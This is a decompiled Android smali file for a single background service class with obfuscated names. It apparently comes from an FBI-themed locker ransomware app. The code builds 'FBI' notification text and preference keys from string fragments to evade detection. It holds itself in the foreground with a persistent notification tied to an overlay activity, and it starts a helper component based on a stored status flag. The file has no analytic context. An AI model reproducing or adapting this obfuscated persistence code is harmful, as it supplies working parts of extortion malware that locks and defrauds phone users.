.class public Lzoeaai/sbevo/tadkw/HampleHverlayHervice;
.super Landroid/app/Service;


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "NewApi"
    }
.end annotation


# static fields
.field public static plivebanked:Lzoeaai/sbevo/tadkw/l;

.field public static presended:Lzoeaai/sbevo/tadkw/HampleHverlayHervice;


# instance fields
.field protected dosendes:Z

.field protected vanila:I

.field protected walmartes:Z


# direct methods
.method public constructor <init>()V
    .locals 1

    const/4 v0, 0x0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    iput-boolean v0, p0, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->walmartes:Z

    iput-boolean v0, p0, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->dosendes:Z

    iput v0, p0, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->vanila:I

    return-void
.end method

.method public static moneyen()V
    .locals 1

    sget-object v0, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->presended:Lzoeaai/sbevo/tadkw/HampleHverlayHervice;

    if-eqz v0, :cond_0

    sget-object v0, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->presended:Lzoeaai/sbevo/tadkw/HampleHverlayHervice;

    invoke-virtual {v0}, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->stopSelf()V

    :cond_0
    return-void
.end method

.method private nelicvelock()Landroid/app/PendingIntent;
    .locals 3

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lzoeaai/sbevo/tadkw/SampleOverlayHideActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v1, 0x0

    const/high16 v2, 0x8000000

    invoke-static {p0, v1, v0, v2}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    return-object v0
.end method


# virtual methods
.method protected giftcard(I)Landroid/app/Notification;
    .locals 6

    const-string v0, "B"

    new-instance v1, Landroid/app/Notification;

    const v2, 0x7f020020

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "F"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "I"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    invoke-direct {v1, v2, v3, v4, v5}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V

    iget v2, v1, Landroid/app/Notification;->flags:I

    or-int/lit8 v2, v2, 0x2

    or-int/lit8 v2, v2, 0x8

    iput v2, v1, Landroid/app/Notification;->flags:I

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "F"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "I "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "F"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, "I"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0}, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->nelicvelock()Landroid/app/PendingIntent;

    move-result-object v3

    invoke-virtual {v1, p0, v2, v0, v3}, Landroid/app/Notification;->setLatestEventInfo(Landroid/content/Context;Ljava/lang/CharSequence;Ljava/lang/CharSequence;Landroid/app/PendingIntent;)V

    return-object v1
.end method

.method public newalmarting(IZ)V
    .locals 1

    invoke-virtual {p0, p1}, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->giftcard(I)Landroid/app/Notification;

    move-result-object v0

    invoke-virtual {p0, p1, v0, p2}, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->pregiftcardes(ILandroid/app/Notification;Z)V

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 5

    const/4 v4, 0x0

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    const-string v0, "te"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "sys"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "ma"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1, v4}, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v2, "start"

    const-string v3, "start"

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "sys"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "ma"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v4}, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v1, "at"

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "st"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "us"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "s0"

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "s9"

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_0

    sput-object p0, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->presended:Lzoeaai/sbevo/tadkw/HampleHverlayHervice;

    new-instance v0, Lzoeaai/sbevo/tadkw/l;

    invoke-direct {v0, p0}, Lzoeaai/sbevo/tadkw/l;-><init>(Lzoeaai/sbevo/tadkw/HampleHverlayHervice;)V

    sput-object v0, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->plivebanked:Lzoeaai/sbevo/tadkw/l;

    :cond_0
    return-void
.end method

.method public onDestroy()V
    .locals 1

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    sget-object v0, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->plivebanked:Lzoeaai/sbevo/tadkw/l;

    if-eqz v0, :cond_0

    sget-object v0, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->plivebanked:Lzoeaai/sbevo/tadkw/l;

    invoke-virtual {v0}, Lzoeaai/sbevo/tadkw/l;->serveres()V

    :cond_0
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public pregiftcardes(ILandroid/app/Notification;Z)V
    .locals 1

    iget-boolean v0, p0, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->walmartes:Z

    if-nez v0, :cond_1

    if-eqz p2, :cond_1

    const/4 v0, 0x1

    iput-boolean v0, p0, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->walmartes:Z

    iput p1, p0, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->vanila:I

    iput-boolean p3, p0, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->dosendes:Z

    invoke-super {p0, p1, p2}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    :cond_0
    :goto_0
    return-void

    :cond_1
    iget v0, p0, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->vanila:I

    if-eq v0, p1, :cond_0

    if-lez p1, :cond_0

    if-eqz p2, :cond_0

    iput p1, p0, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->vanila:I

    const-string v0, "notification"

    invoke-virtual {p0, v0}, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    invoke-virtual {v0, p1, p2}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    goto :goto_0
.end method

.method public vanilaen(IZ)V
    .locals 1

    const/4 v0, 0x0

    iput-boolean v0, p0, Lzoeaai/sbevo/tadkw/HampleHverlayHervice;->walmartes:Z

    invoke-super {p0, p2}, Landroid/app/Service;->stopForeground(Z)V

    return-void
.end method
